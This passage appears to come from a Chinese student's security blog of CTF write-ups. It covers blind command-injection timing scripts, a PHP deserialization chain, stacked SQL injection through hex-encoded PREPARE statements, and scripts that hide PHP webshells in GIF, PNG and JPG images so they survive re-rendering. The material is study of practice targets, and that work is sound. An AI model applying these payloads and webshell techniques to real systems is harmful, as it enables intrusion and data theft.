requests.post(url, data=data) time = response.elapsed.total_seconds() if time &gt; 3: cmd_base64 += s print(cmd_base64) break 下面是实例图片 5.3 枚举flag 服务器未联网，无写入权限。无法getshell等一系列操作，只能通过枚举/二分查找暴力查询flag。 构造脚本遍历： # -*-coding:utf-8 -*- import requests import re flag_format = re.compile('flag\\\\{[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}\\\\}') all_letter = '-}0123456789abcdefghijklmnopqrstuvwxyz' def get_flag(command): try: r = requests.get('http://web.train.lilac.com:10008/', params={'command': command}, timeout=1.5) except: return True return False if __name__ == '__main__': flag = 'flag{' while flag_format.match(flag) == None: staus = 0 for i in all_letter: payload = '| cat /flag | grep %s &amp;&amp; sleep 1.8' % (flag + i) print(payload) if get_flag(payload): staus = 1 flag += i print(flag) break if staus == 0: flag = flag[0:-1] 0x06 CTF题目实战 NewStarCTF 2023 week3 RCE &lt;?php highlight_file(__FILE__); class minipop{ public $code; public $qwejaskdjnlka; public function __toString() { if(!preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\{|\\}|\\&gt;|\\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this-&gt;code)){ exec($this-&gt;code); } return \"alright\"; } public function __destruct() { echo $this-&gt;qwejaskdjnlka; } } if(isset($_POST['payload'])){ //wanna try? unserialize($_POST['payload']); } 先是简单的反序列化，随后是一个无回显RCE的绕过，下面简单写一个pop链 &lt;?php highlight_file(__FILE__); class minipop{ public $code; public $qwejaskdjnlka; } $poc = new minipop(); $poc-&gt;qwejaskdjnlka = new minipop(); $poc-&gt;qwejaskdjnlka-&gt;code = 'RCE'; echo serialize($poc); ?&gt; import time import requests url = \"http://bcdad1a5-6014-4594-a8b5-c4c03f581147.node4.buuoj.cn:81/\" result = \"\" for i in range(1,15): for j in range(1,50): #ascii码表 for k in range(32,127): k=chr(k) payload =f\"if [ `cat /flag_is_h3eeere | awk NR=={i} | cut -c {j}` == '{k}' ];then sleep 2;fi\" length=len(payload) payload2 ={ \"payload\": 'O:7:\"minipop\":2:{s:4:\"code\";N;s:13:\"qwejaskdjnlka\";O:7:\"minipop\":2:{s:4:\"code\";s:{0}:\"{1}\";s:13:\"qwejaskdjnlka\";N;}}'.format(length,payload) } t1=time.time() r=requests.post(url=url,data=payload2) t2=time.time() if t2-t1 &gt;1.5: result+=k print(result) result += \" \" GPT对上述代码的解释 if [ ... ]; then sleep 2; fi：这是一个条件语句，其中包含一个条件测试。如果条件测试为真（true），则执行 sleep 2，即让脚本休眠2秒。这是一种时间延迟技巧，通常用于时间盲注攻击，攻击者根据服务端的响应时间来推断条件是否成立。 ls / | awk NR=={i} | cut -c {j}：这部分的目的是列出根目录 / 下的文件和目录，并使用 awk 和 cut 命令来选择其中一个字符。让我详细解释： ls /：这部分列出了根目录下的文件和目录。 |：管道操作符，将 ls 命令的输出传递给下一个命令。 awk NR=={i}：这是一个 awk 命令，它根据行号 NR 是否等于 {i} 来选择特定行。{i} 是一个变量，它代表外部循环中的 i。 NR 是 AWK 命令中的一个特殊变量，表示当前正在处理的记录（行）的行号 |：再次使用管道操作符，将 awk 命令的输出传递给下一个命令。 cut -c {j}：这是 cut 命令，它根据字符位置 {j} 来选择特定字符。{j} 是一个变量，它代表内部循环中的 j。 == '{k}'：这部分是条件测试的一部分，它检查前面命令的输出字符是否等于变量 k，其中 k 是内部循环中的 ASCII 字符。 这里我发现\"payload\": 'O:7:\"minipop\":2:{s:4:\"code\";N;s:13:\"qwejaskdjnlka\";O:7:\"minipop\":2:{s:4:\"code\";s:{0}:\"{1}\";s:13:\"qwejaskdjnlka\";N;}}'.format(length,payload) 此处代码之间用了两对花括号 O:7:\"minipop\":2:{s:4:\"code\";N;s:13:\"qwejaskdjnlka\";O:7:\"minipop\":2:s:4:\"code\";s:0:\"\";s:13:\"qwejaskdjnlka\";N;}} 这里我就疑问为何他用了两对括号，于是我用之前的先运行一下发现如下报错 如上图发现是keyerror错误，意思是字典格式的错误，csdn搜索了一下发现这个解释的很好 这次写的时候遇到了奇怪的KeyError。我一开始是这么写的： s = r''' function foo() { printf(\"{}\"); } '''.format(arg) 但是这样会报错。 后来发现，因为format自己用大括号作为占位符，如果字符串里本身有大括号，还得转义一下。具体怎么转义，就是用两个大括号，所以应该改成这样： s = r''' function foo() {{ printf(\"{}\"); }} '''.format(arg) 这样才能正常输出。 之后再有类似的题我再更新吧，这次感觉只是简单了解了，似乎还是不熟练啊。 0x07 参考文章 无回显条件下的命令执行判断和利用方式研究 --实战类 web-无回显的命令执行的5种反弹信道 [CTF]命令执行无回显利用 CTF入门web篇18命令执行无回显的判断方法及dnslog相关例题 无回显的渗透技巧 RCE篇之无回显rce Windows/Linux下的无回显命令执行 超全的命令（代码）执行漏洞无回显的姿势总结（附带详细代码和测试分析过程）","tags":["基本知识"],"categories":["web知识总结"]},{"title":"MySQL预处理绕过","path":"/2023/10/27/qian-xi-mysql-yu-chu-li/","content":"0x01 前言 写此文章的来源是做CTF题目时遇到了mysql注入，且那道题的思路是根据MySQL支持的prepare预处理来进行绕过。以前也没了解过，故在此写一篇文章来记录一下。 0x02 Prepare 2.1 简介 多次执行一条 SQL 语句时，如果每次都处理该 SQL 语句，生成执行计划，必然会浪费一定的时间。 SQL预处理（Prepare），是一种特殊的 SQL 处理方式；预处理不会直接执行 SQL 语句，而是先将 SQL 语句编译，生成执行计划，然后通过 Execute 命令携带 SQL 参数执行 SQL 语句。 Prepare 的使用十分广泛，绝大多数 ORM 框架都有 API 支持； Prepare 既可以提升 SQL 执行性能，还能防止 SQL 注入引发的安全问题； Prepare 虽然在每个数据库中的语法差异很大，但是一般情况下我们都不会手写 SQL，而是使用 ORM 框架来做； 2.1 由来 从mysql服务器执行sql的过程来看，SQL执行过程包括以下阶段 词法分析-&gt;语法分析-&gt;语义分析-&gt;执行计划优化-&gt;执行。 词法分析-&gt;语法分析这两个阶段我们称之为硬解析。 词法分析识别sql中每个词； 语法分析解析SQL语句是否符合sql语法，并得到一棵语法树（Lex）。 对于只是参数不同，其他均相同的sql，它们执行时间不同但硬解析的时间是相同的。 而同一SQL随着查询数据的变化，多次查询执行时间可能不同，但硬解析的时间是不变的。所以对于sql执行时间较短，sql硬解析的时间占总执行时间的比率越高。 Prepare的出现就是为了优化硬解析的问题。 虽然Prepare在execute阶段可以节省硬解析的时间。但如果sql只执行一次，且以prepare的方式执行，那么sql执行需两次与服务器交互（Prepare和execute）, 而以普通（非prepare）方式，只需要一次交互。这样使用prepare会带来额外的网络开销，得不偿失。 如果同一sql需要执行多次，比如：以prepare方式执行10次，那么只需要一次硬解析。这时候额外的网络开销就显得微乎其微了；因此prepare更适用于频繁执行的SQL中。 0x03 SQL语句的执行处理 3.1 即时 SQL 一条 SQL 在 DB 接收到最终执行完毕返回，大致的过程如下： 1. 词法和语义解析； 2. 优化 SQL 语句，制定执行计划； 3. 执行并返回结果； 如上，一条 SQL 是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL）。 3.2 预处理 SQL 但是，绝大多数情况下，某需求可能会要求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。 所谓预编译语句就是将此类 SQL 语句中的值用占位符替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫Prepared Statements。 预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。 注意： 虽然是通过预处理 SQL 的方式一定程度的提高了效率，但是对于优化而言，最优的执行计划不是光靠 SQL 语句的模板化来实现的， 往往还是需要通过具体值来预估出成本代价。 0x04 Prepared SQL Statement Syntax MySQL 官方将 prepare、execute、deallocate 统称为 PREPARE STATEMENT。翻译也就习惯的称其为预处理语句。 MySQL 预处理语句的支持版本较早，所以我们目前普遍使用的 MySQL 版本都是支持这一语法的。 语法： # 定义预处理语句 PREPARE stmt_name FROM preparable_stmt; # 执行预处理语句 EXECUTE stmt_name [USING @var_name [, @var_name] ...]; # 删除(释放)定义 {DEALLOCATE | DROP} PREPARE stmt_name; 4.1 利用字符串定义预处理 SQL (直角三角形计算) mysql&gt; PREPARE stmt1 FROM 'SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse'; Query OK, 0 rows affected (0.00 sec) Statement prepared mysql&gt; SET @a = 3; Query OK, 0 rows affected (0.00 sec) mysql&gt; set @b = 4; Query OK, 0 rows affected (0.00 sec) mysql&gt; execute stmt1 using @a, @b; +------------+ | hypotenuse | +------------+ | 5 | +------------+ 1 row in set (0.00 sec) 4.2 利用变量定义预处理 SQL (直角三角形计算) mysql&gt; set @s = 'select sqrt(pow(?,2) + pow(?,2)) as hypotenuse'; Query OK, 0 rows affected (0.00 sec) mysql&gt; prepare stmt2 from @s; Query OK, 0 rows affected (0.00 sec) Statement prepared mysql&gt; set @c = 6; Query OK, 0 rows affected (0.00 sec) mysql&gt; set @d = 8; Query OK, 0 rows affected (0.00 sec) mysql&gt; execute stmt2 using @c, @d; +------------+ | hypotenuse | +------------+ | 10 | +------------+ 1 row in set (0.00 sec) 4.3 解决无法传参问题 我们知道，对于 LIMIT 子句中的值，必须是常量，不得使用变量，也就是说不能使用：SELECT * FROM TABLE LIMIT @skip, @numrows; 但是，可以用 PREPARE 语句解决此问题。 mysql&gt; SET @skip = 100; SET @numrows = 3; Query OK, 0 rows affected (0.00 sec) Query OK, 0 rows affected (0.00 sec) mysql&gt; SELECT * FROM t1 LIMIT @skip, @numrows; ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '@skip, @numrows' at line 1 mysql&gt; PREPARE stmt3 FROM \"SELECT * FROM t1 LIMIT ?, ?\"; Query OK, 0 rows affected (0.00 sec) Statement prepared mysql&gt; EXECUTE stmt3 USING @skip, @numrows; +-----+--------+ | a | filler | +-----+--------+ | 100 | filler | | 101 | filler | | 102 | filler | +-----+--------+ 3 rows in set (0.00 sec) mysql&gt; DEALLOCATE PREPARE stmt3; Query OK, 0 rows affected (0.00 sec) ​ 如此一来，结合2中介绍的利用变量定义预处理 SQL 也就基本解决了传参时语法报错问题了，类似的：用变量传参做表名时， MySQL 会把变量名当做表名，这样既不是本意，也不是语法错误，在 SQL Server 的解决办法是利用字符串拼接穿插变量进行传参，再将 整条 SQL 语句作为变量，最后是用 sp_executesql 调用该拼接 SQL 执行，而 Prepared SQL Statement 可谓异曲同工之妙。 mysql&gt; SET @table = 't2'; Query OK, 0 rows affected (0.00 sec) mysql&gt; SET @s = CONCAT('SELECT * FROM ', @table);#字符串拼接 Query OK, 0 rows affected (0.00 sec) mysql&gt; PREPARE stmt4 FROM @s; Query OK, 0 rows affected (0.00 sec) Statement prepared mysql&gt; EXECUTE stmt4; +------+-------+-------+ | id | score | grade | +------+-------+-------+ | 1 | 99 | A | | 2 | 81 | B | | 3 | 55 | D | | 4 | 69 | C | +------+-------+-------+ 4 rows in set (0.00 sec) mysql&gt; DROP PREPARE stmt4; Query OK, 0 rows affected (0.00 sec) 0x05 预处理 SQL 注意点 1、stmt_name 作为 preparable_stmt 的接收者，唯一标识，不区分大小写。 2、preparable_stmt 语句中的 ? 是个占位符，所代表的是一个字符串，不需要将 ? 用引号包含起来。 3、定义一个已存在的 stmt_name ，原有的将被立即释放，类似于变量的重新赋值。 4、PREPARE stmt_name 的作用域是session级 可以通过 max_prepared_stmt_count 变量来控制全局最大的存储的预处理语句。 mysql&gt; show variables like \"max_prepared%\"; ERROR 2006 (HY000): MySQL server has gone away No connection. Trying to reconnect... Connection id: 4 Current database: *** NONE *** +-------------------------+-------+ | Variable_name | Value | +-------------------------+-------+ | max_prepared_stmt_count | 16382 | +-------------------------+-------+ 1 row in set, 3 warnings (0.01 sec) 预处理编译 SQL 是占用资源的，所以在使用后注意及时使用 DEALLOCATE PREPARE 释放资源，这是一个好习惯。 0x06 实战体悟 在这里根据上述学的来重新做一下那道CTF题目，加深印象。 from flask import Flask, render_template, request import MySQLdb import re blacklist = ['select', 'update', 'insert', 'delete', 'database', 'table', 'column', 'alter', 'create', 'drop', 'and', 'or', 'xor', 'if', 'else', 'then', 'where'] conn = MySQLdb.connect(host='db', port=3306, user='root', passwd='root', db='ctf') app = Flask(__name__) @app.route('/') def index(): field = request.args.get('order', 'id') field = re.sub(r'\\s+', '', field) for s in blacklist: if s.lower() in field.lower(): return s + ' are banned' if not re.match(r\"id|name|email\", field): field = 'id' with conn.cursor() as cursor: cursor.execute('SELECT * FROM userinfo order by %s' % field) res = cursor.fetchall() return render_template('index.html', res=res) if __name__ == '__main__': app.run(host='0.0.0.0', port=8000, debug=True) 这里看上述源码发现，黑名单过滤很全，并且sqlmap也跑不出来。随后陷入只是盲区，看了hint发现cursor.execute可以执行多条语句，由此可以发现这里有堆叠注入的可能（题后反思：这里呢提示我在日后分析代码的时候，学会去找敏感函数，搜寻一下各类函数的用法，说不定就找到漏洞点了）。 那我们直接构造一波prepare语句，既然是预处理了，那完全没必要担心黑名单这个点了。这里呢wp是采用的变量定义预处理SQL //报错注入语句,这里注意报错回显数据是有限的 select updatexml(1, concat(0x7e, substr((select flag from flag), 1, 31), 0x7e), 1); //接着构造预处理SQL id;set/**/@a=0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65 637420737562737472282873656c65637420666c61672066726f6d20666c6167292c312c333129292c30783 765292c31293b;prepare/**/stmt/**/from/**/@a;execute/**/stmt; 这里呢需要进行hex编码的原因是绕过黑名单，由于你这个预处理SQL直接是与MySQL数据库交互，而MySQL是会自动解析16进制并去解码的，故此这里hex编码是必要的。其次使用内联注释符/**/的原因是re.sub这里的函数会过滤掉我们输入的空格字符，因此注释符也是必要的。 这里是set一个变量，并赋值为恶意代码，随后prepare定义预处理语句，接着execute执行预处理语句。 回显flag 0x07 参考文章 MySQL如何对SQL做prepare预处理（解决IN查询SQL预处理仅能查询出一条记录的问题） MySQL的SQL预处理(Prepared) [0xGameCTF 2023] web题解","tags":["基本知识"],"categories":["web知识总结"]},{"title":"深度学习文件上传-二次渲染","path":"/2023/10/26/qian-xi-er-ci-xuan-ran/","content":"0x01 前言 这篇文章是在做CTF新生赛所遇到的，之前虽然做靶场的时候做个二次渲染，但从此次做题效果来看，没啥卵用（之前也没好好学，只是简单了解而已）这次借着靶场环境还在，赶紧学习一波知识！！！ 0x02 二次渲染 题目源码如下： &lt;?php error_reporting(0); session_start(); $user_dir = 'uploads/'.md5($_SERVER['REMOTE_ADDR']).'/'; if (!file_exists($user_dir)) { mkdir($user_dir); } switch ($_FILES['file']['type']) { case \"image/gif\": $source = imagecreatefromgif($_FILES['file']['tmp_name']); break; case \"image/jpeg\": $source = imagecreatefromjpeg($_FILES['file']['tmp_name']); break; case \"image/png\": $source = imagecreatefrompng($_FILES['file']['tmp_name']); break; default: die('Invalid file type!'); } $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION); $filepath = $user_dir.md5($_FILES['file']['name']).'.'.$ext; switch ($_FILES['file']['type']) { case \"image/gif\": imagegif($source, $filepath); break; case \"image/jpeg\": imagejpeg($source, $filepath); break; case \"image/png\": imagepng($source, $filepath); break; default: die('Invalid file type!'); } echo 'Upload avatar success! Path: '.$filepath; $_SESSION['avatar'] = $filepath; ?&gt; 了解一波关键函数： imagecreatefromgif()： 创建一块画布，并从 GIF 文件或 URL 地址载入一副图像 imagecreatefromjpeg()： 创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像 imagecreatefrompng()： 创建一块画布，并从 PNG 文件或 URL 地址载入一副图像 imagecreatefromwbmp()： 创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像 imagecreatefromstring()： 创建一块画布，并从字符串中的图像流新建一副图像 imagecreatefromjpeg二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图 像数据的部分直接就隔离开了，这时候得去找图片经过GD库转化后没有改变的部分，再将未改变的部分修改为相应的php代码。 而其余的像png，gif的函数也是类似。 我们接下来先从最容易利用的图像开始： 2.1 利用GIF 如图我们现在git图像后面添加一句话木马上传 接下来我们访问该连接去下载图片，看看上传前后图片的变化 可以看到此时我们的木马没了。。。接下来我们使用编辑器打开看看哪些区域没有发生变化 这里这个编辑器也没咋用过，不过我认为这里的匹配指的就是A和B图片相同的地方，那我们直接在此处添加一句话木马看看 如下图在此上传成功 这里也是搞错了，忘记上传的时候需要修改后缀了（不然服务器如何将其当做php文件解析呢？）上传成功后我们访问文件路径 如下图成功上传，不过这里似乎是有坑的，在此之前上传了几个gif，发现似乎修改的地方不恰当，最终服务器在解析其为php时会解析错误，所以需要重新搞几次。 这里也没细究原理，一般遇到这种类型的题目，如果选择上传gif的话只需要比较上传前后图片未发生变化的地方，添加一句话木马即可。 2.2 上传PNG png的二次渲染的绕过并不能像gif那样简单 2.2.1 png文件组成 png图片由3个以上的数据块组成. PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了3个标准数据块(IHDR,IDAT, IEND)，每个PNG文件都必须包含它们. 数据块结构 CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC具体算法定义在ISO 3309和ITU-T V.42中，其值按下面的CRC码生成多项式进行计算： x32+x26+x23+x22+x16+x12+x11+x10+x8+x7+x5+x4+x2+x+1 //咱也看不懂。。。。 2.2.2 分析数据块 IHDR 数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。 文件头数据块由13字节组成，它的格式如下图所示。 PLTE 调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。 IDAT 图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。 IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像 IEND 图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。 如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的： 00 00 00 00 49 45 4E 44 AE 42 60 82 2.2.3 写入php代码 在网上找到了两种方式来制作绕过二次渲染的png木马 写入PLTE数据块 php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在chunk data域插入php代码,然后重新计算相应的crc值并修改即可. 这种方式只针对索引彩色图像的png图片才有效,在选取png图片时可根据IHDR数据块的color type辨别.03为索引彩色图像. 在PLTE数据块写入php代码–这里借用师傅的图片了 深有感悟，找了几张png图片发现都没有PLTE数据块，也不想找了。。。。 计算PLTE数据块的CRC，脚本如下 import binascii import re png = open(r'2.png','rb') a = png.read() png.close() #通过 binascii.b2a_hex(a) 将文件内容 a 转换为十六进制字符串，并将结果存储在 hexstr 变量中。 hexstr = binascii.b2a_hex(a) #使用正则表达式 re.findall 从 hexstr 中查找 \"504c5445\"（即 PLTE 标识）和 \"49444154\"（即 IDAT 标识）之间的内容。 ''' PLTE crc ''' data = '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0] #它使用 binascii.crc32 函数对 data[:-16] 进行 CRC32 校验和计算。 crc = binascii.crc32(data[:-16].decode('hex')) &amp; 0xffffffff print hex(crc) 修改CRC值 验证，将修改后的png图片上传后,下载到本地打开 写入IDAT数据块 这里有国外大牛写的脚本,直接拿来运行即可. &lt;?php //创建一个名为 $p 的数组，其中包含了一系列十六进制颜色值。这些颜色值按照 RGB 顺序排列，每三个元素代表一个像素的颜色。 $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); //使用 imagecreatetruecolor 函数创建一个 32x32 像素的真彩色图像对象，并将其分配给 $img 变量。 $img = imagecreatetruecolor(32, 32); //使用 for 循环遍历数组 $p，每次迭代处理三个数组元素，即一个像素的 RGB 值。 for ($y = 0; $y &lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; //每次迭代中，从数组中提取红色（R）、绿色（G）、和蓝色（B）的颜色值，并使用 imagecolorallocate 函数创建一个颜色标识符。 $color = imagecolorallocate($img, $r, $g, $b); //使用 imagesetpixel 函数在图像的第一行（$y / 3 为像素的横坐标，0 为纵坐标）设置像素颜色。 imagesetpixel($img, round($y / 3), 0, $color); } //使用 imagepng 函数将生成的图像保存为名为 \"1.png\" 的文件。 imagepng($img,'./1.png'); ?&gt; 运行后得到1.png.上传后下载到本地打开如下图–大牛就是牛啊，我都不知道这木马如何写上去的。。。 这种方法在做题的时候浮现过了，此处就不在赘述了 2.3 上传JPG 这里也采用国外大牛编写的脚本jpg_payload.php &lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = \"&lt;?=phpinfo();?&gt;\"; if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { die('php-gd is not installed'); } if(!isset($argv[1])) { die('php jpg_payload.php &lt;jpg_name.jpg&gt;'); } set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad &lt; 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) { die('Incorrect SOI marker'); } while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) { $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) { $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-&gt;eof())) { if($dis-&gt;readByte() === 0xFF) { if($dis-&gt;readByte !== 0x00) { break; } } } $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage('payload_'.$argv[1], $outStream)) { die('Success!'); } else { break; } } } } unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-&gt;binData = ''; $this-&gt;order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-&gt;binData = file_get_contents($filename); } else { $this-&gt;binData = $filename; } $this-&gt;size = strlen($this-&gt;binData); } public function seek() { return ($this-&gt;size - strlen($this-&gt;binData)); } public function skip($skip) { $this-&gt;binData = substr($this-&gt;binData, $skip); } public function readByte() { if($this-&gt;eof()) { die('End Of File'); } $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); } public function readShort() { if(strlen($this-&gt;binData) &lt; 2) { die('End Of File'); } $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) { $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); } else { $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); } return $short; } public function eof() { return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); } } ?&gt; 使用方法：随便找一个jpg图片，先上传至服务器然后再下载到本地保存为1.jpg. 插入php代码 使用脚本处理1.jpg,命令php jpg_payload.php 1.jpg 这里尝试了好几次，似乎只能在终端上运行，而且命令必须一模一样，也就是php文件和1.jpg和php.exe需要在同一目录下 使用16进制编辑器打开,就可以看到插入的php代码 不过这里困惑的是执行完命令产生的图片中插入的代码不全，这里如上图之前是没有post的，只存在 这里的post是我之后填上去的，不过测试过后似乎没影响 上传图片马 将生成的payload_1.jpg上传. 这里也是成功上传解析。 这里有师傅提醒：需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片. 接下来就开始学习mysql中的预编译吧，浅浅了解一下。 0x03 参考文章 文件上传漏洞 upload-labs之pass 16详细分析 --非常详细","tags":["基本知识"],"categories":["web知识总结"]},{"title":"0xGame 2023","path":"/2023/10/22/0xgame-2023/","content":"0x01 前言 新生赛真的多，前两周做的时候还心情舒畅，第三周就开始坐牢了，┭┮﹏┭┮，太菜了，新生赛也打不过。俗话说得好：打不过我还不会抄吗（狗头），我直接照着wp开卷！！！ 不过这个0xgame的比赛我只能说，体验感有点差，真心觉得不如动态靶机舒服（而且题目还难！！！） [Week 1] signin ![image-20231022153622957](0xGame 2023/image-20231022153622957.png) 首先打开之后是一个简单的页面，这里页面还说你能找到flag吗？-呵呵，我tm当然找不到了。。。 这里呢我尝试抓包以及dirsearch扫目录均无果，当时就焦虑了，我想着tm第一周的新手题就不会了？？？之后一下想到F12打开抓个包看看是否有信息，嗨，想不到真有 ![image-20231022154409249](0xGame 2023/image-20231022154409249.png) F12开启控制台随后重新刷新一下页面抓包，这里发现有页面的js文件源码，这时我就认为大概率就是此处了哈哈 ![image-20231022154505505](0xGame 2023/image-20231022154505505.png) 一番搜索发现flag果然在此js文件下。 [Week 1] baby_php &lt;?php // flag in flag.php highlight_file(__FILE__); if (isset($_GET['a']) &amp;&amp; isset($_GET['b']) &amp;&amp; isset($_POST['c']) &amp;&amp; isset($_COOKIE['name'])) { $a = $_GET['a']; $b = $_GET['b']; $c = $_POST['c']; $name = $_COOKIE['name']; if ($a != $b &amp;&amp; md5($a) == md5($b)) { if (!is_numeric($c) &amp;&amp; $c != 1024 &amp;&amp; intval($c) == 1024) { include($name.'.php'); } } } ?&gt; 简单的PHP特性，这里首先要求传入的a、b参数不相等，但md5加密后的值要相等，我们直接数组绕过即可。 其次在接着判断c参数是否是数字，只有c满足不是数字，且c不等于1024，且c经过intval取整后等于1024即可包含flag.php文件 那首先是绕过is_numeric函数 is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后 根据上述我们可以实现绕过，不过这里直接在后面+其他字符如a也可以。 其次是$c != 1024 &amp;&amp; intval($c) == 1024这里可以看到有取整函数，那我们应该想到将c赋值为浮点类型，这样就可以成功绕过，并且 intval 也会截断非数字的部分 最终payload如下： GET：?a[]=1&amp;b[]=2 POST：c=1024.1a cookie：name=php://filter/convert.base64-encode/resource=flag 至于为何这里要用php伪协议读取，我猜测是如果直接赋值为flag.php的话，inlcude会执行php文件中的代码，导致最终结果不可见，故此选择伪协议读取，将文件内容进行base64编码导致其不可执行最终回显出来 ![image-20231022160313639](0xGame 2023/image-20231022160313639.png) 如上图直接base64解码即可 [Week 1] hello_http ![image-20231022160421773](0xGame 2023/image-20231022160421773.png) 这里考察http基础知识，根据页面信息我们选择get传参query为ctf ![image-20231022160629635](0xGame 2023/image-20231022160629635.png) 接着让我们post传参action为getflag ![image-20231022160651994](0xGame 2023/image-20231022160651994.png) 又提示我们不是admin，这里还是直接上bp吧 ![image-20231022160725124](0xGame 2023/image-20231022160725124.png) 发现敏感词role，我们将其修改为admin ![image-20231022160754322](0xGame 2023/image-20231022160754322.png) 此时又提示我们不是内网ip，那我们用xff头修改一下看看 ![image-20231022160844324](0xGame 2023/image-20231022160844324.png) 这时提示我们ua头不是指定的，那我们直接修改即可 ![image-20231022160917710](0xGame 2023/image-20231022160917710.png) 最后又提示我们referer头来源不正确，那我们继续修改 ![image-20231022161019184](0xGame 2023/image-20231022161019184.png) 拿到flag [Week 1] repo_leak ![image-20231022161204842](0xGame 